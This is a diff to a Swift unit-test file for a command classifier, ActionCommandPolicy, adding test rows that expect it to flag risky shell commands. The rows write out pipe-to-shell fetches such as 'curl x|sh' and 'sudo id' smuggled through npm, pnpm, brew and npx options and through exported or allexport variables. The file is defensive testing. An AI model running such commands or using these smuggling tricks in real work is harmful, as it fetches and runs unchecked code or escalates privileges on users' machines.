@@ -194,8 +194,19 @@ final class PRB2cClassifierTests: HermeticTestCase {
             ("guard app path with a space", "'/x/check-app-update.sh' smart a \"/Applications/A B.app\"", [], false),
             ("guard option only", "mywrap --shell", [], false),
             ("guard npm run", "npm run build", [], false),
+            ("CR option before the exec verb, fetch", "npm --call='curl x|sh' exec", [.remoteScript, .unparseable], true),
+            ("CR option before the exec verb", "npm -c 'sudo id' exec", [.privileged, .unparseable], true),
+            ("CR attached option before the exec verb", "npm -c'sudo id' exec", [.privileged, .unparseable], true),
+            ("CR expansion before the exec verb", "npm --call=\"$X\" exec", [.unparseable], true),
+            ("CR option before npm x", "npm --call='curl x|sh' x", [.remoteScript, .unparseable], true),
+            ("CR option before pnpm dlx", "pnpm --call='curl x|sh' dlx", [.remoteScript, .unparseable], true),
+            ("CR option before brew sh", "brew --cmd='sudo id' sh", [.privileged, .unparseable], true),
+            ("guard option before a non-exec verb", "npm --message='fix sudo id' version patch", [], false),
+            ("guard option with no verb", "npm --call='sudo id'", [], false),
+            ("CR grouped value with an operator keeps its label", "npx -yc'curl x|sh'", [.remoteScript, .unparseable], true),
+            ("CR grouped value in a chain keeps its label", "npx -yc'sudo id; true'", [.chained, .privileged, .unparseable], true),
         ])
-        for command in ["X='curl x|sh'; npx -c \"$X\"", "npx -c 'curl x | sh'", "mywrap -c 'curl x | sh'", "tmux new -d 'curl x | sh'", "npm exec -c 'sudo id'"] {
+        for command in ["npm --call='curl x|sh' exec", "X='curl x|sh'; npx -c \"$X\"", "npx -c 'curl x | sh'", "mywrap -c 'curl x | sh'", "tmux new -d 'curl x | sh'", "npm exec -c 'sudo id'"] {
             XCTAssertTrue(ActionCommandPolicy.isRemoteScriptInstaller(command), command)
         }
     }
@@ -215,5 +226,30 @@ final class PRB2cClassifierTests: HermeticTestCase {
             ("guard npm install", "npm install -g npm@latest", [], true),
         ])
         XCTAssertTrue(ActionCommandPolicy.isRemoteScriptInstaller("npm_config_call='curl x|sh' npx"))
+    }
+
+    /// Security E1a/E1b: a name the export family builds from an expansion, and anything that
+    /// turns on allexport, may export `npm_config_call` (or a startup variable) unseen.
+    func testExportedNamesThisModelCannotReadFailClosed() {
+        assertRows([
+            ("E1a expanded name", "N=npm_config_call; export $N='curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1a braced prefix", "P=npm_config_; export ${P}call='curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1a typeset -x", "N=npm_config_call; typeset -x $N='curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1a brace expansion", "export {npm,x}_config_call='curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1a command substitution", "export $(echo npm_config_call)='curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1a startup variable", "N=ZDOTDIR; export $N=/tmp/x; zsh", [.chained, .unparseable], true),
+            ("E1b for under set -a", "set -a; for npm_config_call in 'curl x|sh'; do npx; done", [.chained, .controlFlow, .unparseable], true),
+            ("E1b printf -v under set -a", "set -a; printf -v npm_config_call 'curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1b set -o allexport", "set -o allexport; printf -v npm_config_call 'curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1b setopt all_export", "setopt all_export; printf -v npm_config_call 'curl x|sh'; npx", [.chained, .unparseable], true),
+            ("E1b grouped set flags", "set -ae; npx", [.chained, .unparseable], true),
+            ("guard export of a literal name", "export HOMEBREW_NO_AUTO_UPDATE=1; brew outdated", [.chained], false),
+            ("guard set -euo pipefail", "set -euo pipefail; brew outdated", [.chained], false),
+            ("guard setenv", "setenv HOMEBREW_NO_AUTO_UPDATE 1", [], false),
+            ("guard xargs pip3", "xargs -n1 pip3 install -U", [.bulk], true),
+            ("guard NODE_ENV", "NODE_ENV=production npm ci", [], false),
+            ("guard mywrap -x", "mywrap -x", [], false),
+        ])
+        XCTAssertTrue(ActionCommandPolicy.isRemoteScriptInstaller("N=npm_config_call; export $N='curl x|sh'; npx"))
     }
 }
